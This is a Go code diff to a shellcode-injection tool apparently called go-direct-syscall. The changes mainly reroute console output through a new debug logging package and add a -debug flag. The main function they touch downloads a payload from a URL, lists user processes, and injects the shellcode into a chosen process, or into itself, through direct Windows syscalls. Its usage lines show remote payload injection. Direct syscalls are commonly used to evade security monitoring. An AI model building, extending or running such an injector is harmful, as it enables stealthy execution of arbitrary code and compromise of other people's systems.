@@ -15,6 +15,7 @@ import (
 	"unsafe"
 
 	winapi "github.com/carved4/go-direct-syscall"
+	"github.com/carved4/go-direct-syscall/pkg/debug"
 )
 
 
@@ -459,13 +460,13 @@ func main() {
 
 	// Prewarm the syscall cache :3
 	if cacheErr := winapi.PrewarmSyscallCache(); cacheErr != nil {
-		fmt.Printf("Warning: Failed to prewarm cache: %v\n", cacheErr)
+		debug.Printfln("MAIN", "Warning: Failed to prewarm cache: %v\n", cacheErr)
 	}
 
 	
 	// Display cache statistics
 	stats := winapi.GetSyscallCacheStats()
-	fmt.Printf("Syscall cache initialized - Size: %v, Algorithm: %v\n", 
+	debug.Printfln("MAIN", "Syscall cache initialized - Size: %v, Algorithm: %v\n", 
 		stats["cache_size"], stats["hash_algorithm"])
 	
 	// Parse command line flags
@@ -473,17 +474,24 @@ func main() {
 	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode (uses self-injection by default)")
 	dumpFlag := flag.Bool("dump", false, "Dump all available syscalls from ntdll.dll")
 	selfFlag := flag.Bool("self", false, "Use self-injection instead of remote process injection")
+	debugFlag := flag.Bool("debug", false, "Enable debug logging for all operations")
 
 	flag.Parse()
 
+	// Enable debug mode if requested
+	if *debugFlag {
+		debug.SetDebugMode(true)
+		debug.Printfln("MAIN", "Debug mode enabled\n")
+	}
+
 	// Check if dump flag is used
 	if *dumpFlag {
-		fmt.Println("Dumping all available syscalls from ntdll.dll...")
-		fmt.Println("=" + strings.Repeat("=", 79))
+		debug.Printfln("MAIN", "Dumping all available syscalls from ntdll.dll...\n")
+		debug.Printfln("MAIN", "%s\n", "=" + strings.Repeat("=", 79))
 		
 		// Demonstrate NT Status code formatting
-		fmt.Println("\nNT Status Code Examples:")
-		fmt.Println("------------------------")
+		debug.Printfln("MAIN", "\nNT Status Code Examples:\n")
+		debug.Printfln("MAIN", "------------------------\n")
 		exampleStatuses := []uintptr{
 			winapi.STATUS_SUCCESS,
 			winapi.STATUS_INFO_LENGTH_MISMATCH,
@@ -496,13 +504,13 @@ func main() {
 		}
 		
 		for _, status := range exampleStatuses {
-			fmt.Printf("  %s\n", winapi.FormatNTStatus(status))
+			debug.Printfln("MAIN", "  %s\n", winapi.FormatNTStatus(status))
 		}
-		fmt.Println()
+		debug.Printfln("MAIN", "\n")
 		
 		syscalls, err := winapi.DumpAllSyscallsWithFiles()
 		if err != nil {
-			fmt.Printf("Failed to dump syscalls: %v\n", err)
+			debug.Printfln("MAIN", "Failed to dump syscalls: %v\n", err)
 			os.Exit(1)
 		}
 		
@@ -512,15 +520,15 @@ func main() {
 		})
 		
 		// Display to console
-		fmt.Printf("%-4s %-40s %-12s %-16s\n", "SSN", "Function Name", "Hash", "Address")
-		fmt.Printf("%-4s %-40s %-12s %-16s\n", strings.Repeat("-", 4), strings.Repeat("-", 40), strings.Repeat("-", 12), strings.Repeat("-", 16))
+		debug.Printfln("MAIN", "%-4s %-40s %-12s %-16s\n", "SSN", "Function Name", "Hash", "Address")
+		debug.Printfln("MAIN", "%-4s %-40s %-12s %-16s\n", strings.Repeat("-", 4), strings.Repeat("-", 40), strings.Repeat("-", 12), strings.Repeat("-", 16))
 		
 		for _, sc := range syscalls {
-			fmt.Printf("%-4d %-40s 0x%-10X 0x%-14X\n", 
+			debug.Printfln("MAIN", "%-4d %-40s 0x%-10X 0x%-14X\n", 
 				sc.SyscallNumber, sc.Name, sc.Hash, sc.Address)
 		}
 		
-		fmt.Printf("\nTotal syscalls found: %d\n", len(syscalls))
+		debug.Printfln("MAIN", "\nTotal syscalls found: %d\n", len(syscalls))
 		
 		// Prepare data for JSON export
 		ntdllBase := "0x0"
@@ -549,19 +557,19 @@ func main() {
 		// Marshal to JSON with proper indentation
 		jsonData, err := json.MarshalIndent(dumpResult, "", "  ")
 		if err != nil {
-			fmt.Printf("Failed to marshal JSON: %v\n", err)
+			debug.Printfln("MAIN", "Failed to marshal JSON: %v\n", err)
 			os.Exit(1)
 		}
 		
 		// Write to file
 		err = os.WriteFile(filename, jsonData, 0644)
 		if err != nil {
-			fmt.Printf("Failed to write JSON file: %v\n", err)
+			debug.Printfln("MAIN", "Failed to write JSON file: %v\n", err)
 			os.Exit(1)
 		}
 		
-		fmt.Printf("\n✓ Syscall dump saved to: %s\n", filename)
-		fmt.Printf("✓ File size: %.2f KB\n", float64(len(jsonData))/1024)
+		debug.Printfln("MAIN", "\n✓ Syscall dump saved to: %s\n", filename)
+		debug.Printfln("MAIN", "✓ File size: %.2f KB\n", float64(len(jsonData))/1024)
 		return
 	}
 
@@ -572,24 +580,27 @@ func main() {
 	if *exampleFlag {
 		// Embedded calc shellcode
 		payload = getEmbeddedShellcode()
-		fmt.Printf("Using embedded calc shellcode (%d bytes)\n", len(payload))
-		fmt.Printf("NT Status formatting enabled: Success = %s\n", winapi.FormatNTStatus(winapi.STATUS_SUCCESS))
+		debug.Printfln("MAIN", "Using embedded calc shellcode (%d bytes)\n", len(payload))
+		debug.Printfln("MAIN", "NT Status formatting enabled: Success = %s\n", winapi.FormatNTStatus(winapi.STATUS_SUCCESS))
 	} else {
 		// Check if URL is provided
 		url := *urlFlag
 		if url == "" {
+			// This is an error condition, so we always show it regardless of debug mode
 			fmt.Println("Error: You must specify either -url, -example, or -dump flag")
 			fmt.Println("Usage:")
-			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin                    # Remote injection")
-			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin -self             # Self injection")
-			fmt.Println("  ./cmd.exe -example                                              # Self injection with embedded calc")
-			fmt.Println("  ./cmd.exe -dump                                                 # Dump syscalls")
+			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin                    # Remote injection")
+			fmt.Println("  ./go-direct-syscall.exe -url http://example.com/payload.bin -self             # Self injection")
+			fmt.Println("  ./go-direct-syscall.exe -example                                              # Self injection with embedded calc")
+			fmt.Println("  ./go-direct-syscall.exe -dump                                                 # Dump syscalls")
+			fmt.Println("  ./go-direct-syscall.exe -debug -example                                       # Self injection with debug logging")
 			os.Exit(1)
 		}
 		
 		// Download the payload
 		payload, err = downloadPayload(url)
 		if err != nil {
+			// This is an error condition, so we always show it regardless of debug mode
 			fmt.Printf("Failed to download payload: %v\n", err)
 			return
 		}
@@ -601,12 +612,12 @@ func main() {
 	var selectedProcess ProcessInfo
 	
 	if useSelfInjection {
-		fmt.Println("Using self-injection mode")
+		debug.Printfln("MAIN", "Using self-injection mode\n")
 	} else {
 		// Remote injection mode - get process list and let user select
 		allProcesses, err := getProcessList()
 		if err != nil {
-			fmt.Printf("Failed to get process list: %v\n", err)
+			debug.Printfln("MAIN", "Failed to get process list: %v\n", err)
 			return
 		}
 		
@@ -638,23 +649,23 @@ func main() {
 		}
 		
 		if len(processes) == 0 {
-			fmt.Println("No user processes found.")
+			debug.Printfln("MAIN", "No user processes found.\n")
 			return
 		}
 		
-		fmt.Printf("Using remote injection mode - showing %d user processes\n", len(processes))
+		debug.Printfln("MAIN", "Using remote injection mode - showing %d user processes\n", len(processes))
 		
 		// Display process list for manual selection
-		fmt.Println("\nAvailable processes:")
-		fmt.Println("-------------------")
+		debug.Printfln("MAIN", "\nAvailable processes:\n")
+		debug.Printfln("MAIN", "-------------------\n")
 		for i, proc := range processes {
-			fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
+			debug.Printfln("MAIN", "[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
 		}
 		
 		// Prompt user to select a process
 		var selectedIndex int
 		for {
-			fmt.Print("\nEnter process number to inject into: ")
+			debug.Printfln("MAIN", "\nEnter process number to inject into: ")
 			scanner := bufio.NewScanner(os.Stdin)
 			if scanner.Scan() {
 				input := strings.TrimSpace(scanner.Text())
@@ -662,7 +673,7 @@ func main() {
 				// Parse the input
 				index, err := strconv.Atoi(input)
 				if err != nil || index < 1 || index > len(processes) {
-					fmt.Printf("Invalid selection. Please enter a number between 1 and %d\n", len(processes))
+					debug.Printfln("MAIN", "Invalid selection. Please enter a number between 1 and %d\n", len(processes))
 					continue
 				}
 				
@@ -671,14 +682,14 @@ func main() {
 			}
 			
 			if err := scanner.Err(); err != nil {
-				fmt.Printf("Error reading input: %v\n", err)
+				debug.Printfln("MAIN", "Error reading input: %v\n", err)
 				return
 			}
 		}
 		
 		// Get the selected process
 		selectedProcess = processes[selectedIndex]
-		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
+		debug.Printfln("MAIN", "\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
 	}
 
 	
@@ -689,19 +700,19 @@ func main() {
 		err = winapi.NtInjectSelfShellcode(payload)
 		
 		if err != nil {
-			fmt.Printf("Self-injection failed: %v\n", err)
+			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
 		} else {
-			fmt.Println("Self-injection Successful")
+			debug.Printfln("MAIN", "Self-injection Successful\n")
 		}
 	} else {
 		// Remote injection
-		fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
+		debug.Printfln("MAIN", "Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
 		err = directSyscallInjector(payload, selectedProcess.Pid)
 		
 		if err != nil {
-			fmt.Printf("Remote injection failed: %v\n", err)
+			debug.Printfln("MAIN", "Remote injection failed: %v\n", err)
 		} else {
-			fmt.Println("Remote injection Successful")
+			debug.Printfln("MAIN", "Remote injection Successful\n")
 		}
 	}
 }
